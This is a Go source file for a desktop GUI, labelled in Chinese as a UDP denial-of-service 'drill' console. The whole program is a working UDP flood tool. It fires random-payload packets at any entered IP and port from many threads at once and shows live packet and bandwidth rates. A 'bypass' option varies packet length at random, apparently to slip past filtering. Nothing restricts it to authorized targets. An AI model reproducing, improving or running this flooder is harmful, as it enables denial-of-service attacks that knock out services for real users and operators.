package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"net"
	"runtime"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

// 全局统计变量
var (
	globalPPS uint64
	globalBPS uint64
)

func main() {
	myApp := app.New()
	myWindow := myApp.NewWindow("UDP dos 演练控制台")
	myWindow.Resize(fyne.NewSize(520, 650))

	// 输入组件
	targetEntry := widget.NewEntry()
	targetEntry.SetPlaceHolder("目标 IP ")
	portEntry := widget.NewEntry()
	portEntry.SetText("8080")
	threadEntry := widget.NewEntry()
	threadEntry.SetText(strconv.Itoa(runtime.NumCPU()))
	sizeEntry := widget.NewEntry()
	sizeEntry.SetText("128")
	durationEntry := widget.NewEntry()
	durationEntry.SetText("60")
	hexEntry := widget.NewEntry()
	hexEntry.SetPlaceHolder("协议头 Hex (可选)")
	bypassCheck := widget.NewCheck("开启 Bypass 模式 (动态长度抖动)", nil)

	// 速率显示组件
	ppsLabel := widget.NewLabel("当前 PPS: 0")
	bpsLabel := widget.NewLabel("当前带宽: 0.00 Mbps")
	
	logOutput := widget.NewMultiLineEntry()
	logOutput.Disable()

	progress := widget.NewProgressBar()
	
	var cancelFunc context.CancelFunc
	var wg sync.WaitGroup

	runBtn := widget.NewButton("开始演练", nil)
	stopBtn := widget.NewButton("停止演练", nil)
	stopBtn.Disable()

	runBtn.OnTapped = func() {
		target := targetEntry.Text
		if target == "" {
			logOutput.SetText("错误: 必须输入目标地址")
			return
		}

		port, _ := strconv.Atoi(portEntry.Text)
		threads, _ := strconv.Atoi(threadEntry.Text)
		size, _ := strconv.Atoi(sizeEntry.Text)
		duration, _ := strconv.Atoi(durationEntry.Text)
		header, _ := hex.DecodeString(hexEntry.Text)

		// 初始化数据
		atomic.StoreUint64(&globalPPS, 0)
		atomic.StoreUint64(&globalBPS, 0)
		runBtn.Disable()
		stopBtn.Enable()
		logOutput.SetText(fmt.Sprintf("[+] 正在向 %s:%d 发送流量...", target, port))

		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
		cancelFunc = cancel

		// 启动流量统计协程 (主 UI 线程)
		go func() {
			ticker := time.NewTicker(time.Second)
			startTime := time.Now()
			defer ticker.Stop()

			// 启动发包线程
			for i := 0; i < threads; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					worker(ctx, target, port, header, size, bypassCheck.Checked)
				}()
			}

			for {
				select {
				case <-ticker.C:
					// 获取并重置统计数据
					currentPPS := atomic.SwapUint64(&globalPPS, 0)
					currentBPS := atomic.SwapUint64(&globalBPS, 0)
					
					// 计算进度
					elapsed := time.Since(startTime).Seconds()
					p := elapsed / float64(duration)
					
					// 安全更新 UI
					ppsLabel.SetText(fmt.Sprintf("当前 PPS: %d", currentPPS))
					bpsLabel.SetText(fmt.Sprintf("当前带宽: %.2f Mbps", float64(currentBPS*8)/1024/1024))
					if p <= 1.0 {
						progress.SetValue(p)
					}

				case <-ctx.Done():
					goto finished
				}
			}

		finished:
			wg.Wait()
			runBtn.Enable()
			stopBtn.Disable()
			progress.SetValue(1.0)
			ppsLabel.SetText("当前 PPS: 0 (停止)")
			bpsLabel.SetText("当前带宽: 0.00 Mbps (停止)")
			logOutput.SetText(logOutput.Text + "\n[+] 演练任务已完成。")
		}()
	}

	stopBtn.OnTapped = func() {
		if cancelFunc != nil {
			cancelFunc()
		}
	}

	// 布局布局
	myWindow.SetContent(container.NewPadded(
		container.NewVBox(
			widget.NewLabelWithStyle("UDP 应急演练专业控制台v1.0", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
			widget.NewSeparator(),
			container.NewGridWithColumns(2, 
				container.NewVBox(widget.NewLabel("目标 IP"), targetEntry),
				container.NewVBox(widget.NewLabel("目标端口"), portEntry),
			),
			container.NewGridWithColumns(3,
				container.NewVBox(widget.NewLabel("线程数"), threadEntry),
				container.NewVBox(widget.NewLabel("基准大小"), sizeEntry),
				container.NewVBox(widget.NewLabel("时长(秒)"), durationEntry),
			),
			widget.NewLabel("十六进制头部 (Hex):"), hexEntry,
			bypassCheck,
			container.NewGridWithColumns(2, runBtn, stopBtn),
			widget.NewSeparator(),
			widget.NewLabel("实时统计:"),
			container.NewGridWithColumns(2, ppsLabel, bpsLabel),
			progress,
			widget.NewLabel("执行日志:"),
			container.NewMax(logOutput),
		),
	))

	myWindow.ShowAndRun()
}

func worker(ctx context.Context, target string, port int, header []byte, baseSize int, bypass bool) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		return
	}
	defer conn.Close()

	payload := make([]byte, baseSize+128)
	headerLen := len(header)
	if headerLen > 0 {
		copy(payload, header)
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			currentSize := baseSize
			if bypass && baseSize > 32 {
				// 动态长度抖动
				n, _ := rand.Int(rand.Reader, big.NewInt(32))
				currentSize = (baseSize - 16) + int(n.Int64())
			}

			if currentSize > headerLen {
				rand.Read(payload[headerLen:currentSize])
			}

			n, err := conn.Write(payload[:currentSize])
			if err == nil {
				// 只有发送成功才统计
				atomic.AddUint64(&globalPPS, 1)
				atomic.AddUint64(&globalBPS, uint64(n))
			}
		}
	}
}